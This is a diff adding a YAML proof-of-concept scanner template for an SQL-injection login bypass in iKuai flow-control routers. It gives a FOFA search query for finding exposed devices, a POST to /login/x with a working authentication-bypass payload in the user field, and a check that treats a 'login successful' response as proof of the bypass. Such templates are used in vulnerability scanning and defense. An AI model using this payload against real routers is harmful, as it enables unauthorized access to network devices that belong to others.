@@ -1,0 +1,25 @@
+id: poc-yaml-ikuai-flow-control-routing-sqli
+info:
+  name: iKuai 流控路由 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: iKuai 流控路由
+  fofa: title="登录爱快流控路由"
+requests:
+- method: POST
+  path: /login/x
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: user="or""=""or""="&pass=
+  expression: 'status_code == 200
+
+    && contains(body,"\"recode\":0")
+
+    && contains(body,"\"error\":\"\\u767b\\u5f55\\u6210\\u529f\"")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
